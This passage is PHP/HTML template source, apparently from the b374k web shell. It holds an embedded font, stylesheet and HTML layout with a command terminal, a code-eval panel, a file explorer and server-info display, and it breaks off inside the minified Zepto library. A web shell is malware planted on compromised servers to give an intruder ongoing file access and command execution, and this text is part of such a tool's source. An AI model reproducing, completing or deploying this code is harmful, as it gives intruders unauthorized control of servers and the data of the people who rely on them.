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) format('woff');
font-weight: normal;
font-style: normal;}*{
font-family:ubuntumono;
margin:0;
padding:0;
border:0;
-webkit-box-sizing:border-box;
-moz-box-sizing:border-box;
box-sizing:border-box;
font-size:12px;
font-weight:normal;}input:focus, select:focus, textarea:focus, button:focus{
outline:none;}html, body{
width:100%;
height:100%;
color:#222222;}body{
background:#f0f0f0;
line-height:17px;}a{
text-decoration:none;
color:#000000;}a:hover{
cursor:pointer;}p{
padding:8px 0;}img{
vertical-align:middle;}table{
width:100%;}table td, table th{
vertical-align:middle;
padding:8px;}textarea, input, select{
background:#ffffff;
padding:8px;
border-radius:8px;
color:#111111;
border:1px solid #dddddd;}textarea{
resize:vertical;
width:100%;
height:300px;
min-height:300px;
max-width:100%;
min-width:100%;}hr{
margin:8px 0;
border-bottom:1px dashed #dddddd;}video{
width:100%;
background:#222222;
border-radius:8px;}h1, h2{
background:#E7E7E7;
border-bottom: 1px solid #cccccc;
color:#000000;
border-radius:8px;
text-align:center;
cursor:pointer;
padding:8px;
margin-bottom:8px;}h1 a, h2 a{
color:#000000;}pre, #viewFilecontent{
word-break:break-all;
word-wrap:break-word;}pre{
white-space:pre-wrap;}#b374k{
cursor:pointer;}#header{
width:100%;
position:fixed;}#headerNav{
padding:10px 8px 6px 8px;
background:#333333;}#headerNav img{
margin:0 4px;}#headerNav a{
color:#efefef;}#menu{
background:#7C94A8;
height:33px;
border-bottom:3px solid #CCCFD1;}#menu .menuitem{
padding:7px 12px 6px 12px;
float:left;
height:30px;
background:#7C94A8;
color:#ffffff;
cursor:pointer;}#menu .menuitem:hover, #menu .menuitemSelected{
background:#768999;
color:#ffffff;}#menu .menuitemSelected{
background:#768999;}#basicInfo{
width:100%;
padding:8px;
border-bottom:1px dashed #dddddd;}#content{
background:#f0f0f0;
height:100%;
padding:66px 8px 8px 8px;}#content .menucontent{
background:#f0f0f0;
clear:both;
display:none;
padding:8px;
overflow-x:auto;
overflow-y:hidden;}#overlay{
position:fixed;
top:0px;
left:0px;
width:100%;
height:100%;
display:none;}#loading{
width:64px;
height:64px;
background:#7C94A8;
border-radius:32px 0 32px 0;
margin:auto;
vertical-align:middle;}#ulDragNDrop{
padding:32px 0;
text-align:center;
background:#7C94A8;
border-radius:8px;
color:#ebebeb;}#form{
display:none;}#devTitle{
background:#ebebeb;}.box{
min-width:50%;
border:1px solid #dddddd;
padding:8px 8px 0 8px;
border-radius:8px;
position:fixed;
background:#ebebeb;
opacity:1;
box-shadow:1px 1px 25px #150f0f;
opacity:0.98;}.boxtitle{
background:#dddddd;
border: 1px solid #cccccc;
color:#000000;
border-radius:8px;
text-align:center;
cursor:pointer;}.boxtitle a, .boxtitle a:hover{
color:#000000;}.boxcontent{
padding:2px 0 2px 0;}.boxresult{
padding:4px 10px 6px 10px;
border-top:1px solid #dddddd;
margin-top:4px;
text-align:center;}.boxtbl{
border:1px solid #dddddd;
border-radius:8px;
padding-bottom:8px;
background:#ebebeb;}.boxtbl td{
vertical-align:middle;
padding:8px 15px;
border-bottom:1px dashed #dddddd;}.boxtbl input, .boxtbl select, .boxtbl .button{
width:100%;}.boxlabel{
text-align: center;
border-bottom:1px solid #dddddd;
padding-bottom:8px;}.boxclose{
background:#222222;
border-radius:3px;
margin-right:8px;
margin-top:-3px;
padding:2px 8px;
cursor:pointer;
color:#ffffff;}.strong{
color:#7C94A8;
text-shadow:0px 0px 1px #C0DCF5;}.weak{
color:#666666;}.button{
min-width:120px;
width:120px;
margin:2px;
color:#ffffff;
background:#7C94A8;
border:none;
padding:8px;
border-radius:8px;
display:block;
text-align:center;
float:left;
cursor:pointer;}.button:hover, #ulDragNDrop:hover{
background:#768999;}.floatLeft{
float:left;}.floatRight{
float:right;}.colFit{
width:1px;
white-space:nowrap;}.colSpan{
width:100%;}.border{
border:1px solid #dddddd;
background:#ebebeb;
border-radius:8px;
padding:8px;}.borderbottom{
border-bottom:1px dashed #dddddd;}.borderright{
border-right:1px dashed #dddddd;}.borderleft{
border-left:1px dashed #dddddd;}.hr td{
border-bottom:1px dashed #dddddd;}.cBox, .cBoxAll{
width:10px;
height:10px;
border:1px solid #7C94A8;
border-radius:5px;
margin:auto;
float:left;
margin:3px 6px 2px 6px;
cursor:pointer;}.cBoxSelected{
background:#7C94A8;}.action, .actionfolder, .actiondot{
cursor:pointer;}.phpError{
padding:8px;
margin:8px 0;
text-align:center;}.dataView td, .dataView th, #viewFile td{
vertical-align:top;
border-bottom:1px dashed #dddddd;}.dataView tbody tr:hover{
background:#ebebeb;}.dataView th{
vertical-align:middle;
border-bottom:0;
background:#e0e0e0;}.dataView tfoot td{
vertical-align:middle;}.dataView .col-cbox{
text-align:center;
width:20px;}.dataView .col-size{
width:70px;}#xplTable tr>td:nth-child(3){
text-align:left;}#xplTable tr>td:nth-child(4),#xplTable tr>td:nth-child(5),#xplTable tr>td:nth-child(6){
text-align:center;}.dataView .col-owner{
width:140px;
min-width:140px;
text-align:center;}.dataView .col-perms{
width:80px;
text-align:center;}.dataView .col-modified{
width:150px;
text-align:center;}.sortable th{
cursor:pointer;}#xplTable td{
white-space:nowrap;}#viewFile td{
text-align:left;}#viewFilecontent{
padding:8px;
border:1px solid #dddddd;
border-radius:8px;}#terminalPrompt td{
padding:0;}#terminalInput{
background:none;
border:none;
padding:0;
width:100%;}#evalAdditional{
display:none;}.hl_default{
color:#517797;}.hl_keyword{
color:#00BB00;}.hl_string{
color:#000000;}.hl_html{
color:#CE5403;}.hl_comment{
color:#7F9F7F;}#navigation{position:fixed;left:-16px;top:46%;}#totop,#tobottom,#toggleBasicInfo{background:url('<?php echo get_resource('arrow');?>');width:32px;height:32px;opacity:0.30;margin:18px 0;cursor:pointer;}#totop:hover,#tobottom:hover{opacity:0.80;}#toggleBasicInfo{display:none;float:right;margin:0;}#basicInfoSplitter{display:none;}#tobottom{-webkit-transform:scaleY(-1);-moz-transform:scaleY(-1);-o-transform:scaleY(-1);transform:scaleY(-1);filter:FlipV;-ms-filter:"FlipV";}#showinfo{float:right;display:none;}#logout{float:right;}</style>
</head>
<body>
<!--wrapper start-->
<div id='wrapper'>
<!--header start-->
<div id='header'>
<!--header info start-->
<div id='headerNav'>
<span><a onclick="set_cookie('cwd', '');" href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title']." ".$GLOBALS['ver']?></a></span>
<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span><a class='boxclose' id='logout' title='log out'>x</a>
<a class='boxclose' id='showinfo' title='show info'>v</a>
</div>
<!--header info end--><!--menu start-->
<div id='menu'>
<?php
foreach($GLOBALS['module_to_load'] as $k){
echo "<a class='menuitem' id='menu".$GLOBALS['module'][$k]['id']."' href='#!".$GLOBALS['module'][$k]['id']."'>".$GLOBALS['module'][$k]['title']."</a>";}?>
</div>
<!--menu end--></div>
<!--header end--><!--content start-->
<div id='content'>
<!--server info start-->
<div id='basicInfo'>
<div id='toggleBasicInfo'></div>
<?php
echo $error_html;
foreach(get_server_info() as $k=>$v){
echo "<div>".$v."</div>";}?>
</div>
<!--server info end--><?php
foreach($GLOBALS['module_to_load'] as $k){
$content = $GLOBALS['module'][$k]['content'];
echo "<div class='menucontent' id='".$GLOBALS['module'][$k]['id']."'>".$content."</div>";}?>
</div>
<!--content end--></div>
<!--wrapper end-->
<div id='navigation'>
<div id='totop'></div>
<div id='tobottom'></div>
</div>
<table id="overlay"><tr><td><div id="loading" ondblclick='loading_stop();'></div></td></tr></table>
<form action='<?php echo get_self(); ?>' method='post' id='form' target='_blank'></form>
<!--script start-->
<script type='text/javascript'>
var targeturl = '<?php echo get_self(); ?>';
var module_to_load = '<?php echo implode(",", $GLOBALS['module_to_load']);?>';
var win = <?php echo (is_win())?'true':'false';?>;
var init_shell = true;
/* Zepto v1.1.2 - zepto event ajax form ie - zeptojs.com/license */
var Zepto=function(){function G(a){return a==null?String(a):z[A.call(a)]||"object"}function H(a){return G(a)=="function"}function I(a){return a!=null&&a==a.window}function J(a){return a!=null&&a.nodeType==a.DOCUMENT_NODE}function K(a){return G(a)=="object"}function L(a){return K(a)&&!I(a)&&Object.getPrototypeOf(a)==Object.prototype}function M(a){return a instanceof Array}function N(a){return typeof a.length=="number"}function O(a){return g.call(a,function(a){return a!=null})}function P(a){return a.length>0?c.fn.concat.apply([],a):a}function Q(a){return a.replace(/::/g,"/").replace(/([A-Z]+)([A-Z][a-z])/g,"$1_$2").replace(/([a-z\d])([A-Z])/g,"$1_$2").replace(/_/g,"-").toLowerCase()}function R(a){return a in j?j[a]:j[a]=new RegExp("(^|\\s)"+a+"(\\s|$)")}function S(a,b){return typeof b=="number"&&!k[Q(a)]?b+"px":b}function T(a){var b,c;return i[a]||(b=h.createElement(a),h.body.appendChild(b),c=getComputedStyle(b,"").getPropertyValue("display"),b.parentNode.removeChild(b),c=="none"&&(c="block"),i[a]=c),i[a]}function U(a){return"children"in a?f.call(a.children):c.map(a.childNodes,function(a){if(a.nodeType==1)return a})}function V(c,d,e){for(b in d)e&&(L(d[b])||M(d[b]))?(L(d[b])&&!L(c[b])&&(c[b]={}),M(d[b])&&!M(c[b])&&(c[b]=[]),V(c[b],d[b],e)):d[b]!==a&&(c[b]=d[b])}function W(a,b){return b==null?c(a):c(a).filter(b)}function X(a,b,c,d){return H(b)?b.call(a,c,d):b}function Y(a,b,c){c==null?a.removeAttribute(b):a.setAttribute(b,c)}function Z(b,c){var d=b.className,e=d&&d.baseVal!==a;if(c===a)return e?d.baseVal:d;e?d.baseVal=c:b.className=c}function $(a){var b;try{return a?a=="true"||(a=="false"?!1:a=="null"?null:!/^0/.test(a)&&!isNaN(b=Number(a))?b:/^[\[\{]/.test(a)?c.parseJSON(a):a):a}catch(d){return a}}function _(a,b){b(a);for(var c in a.childNodes)_(a.childNodes[c],b)}var 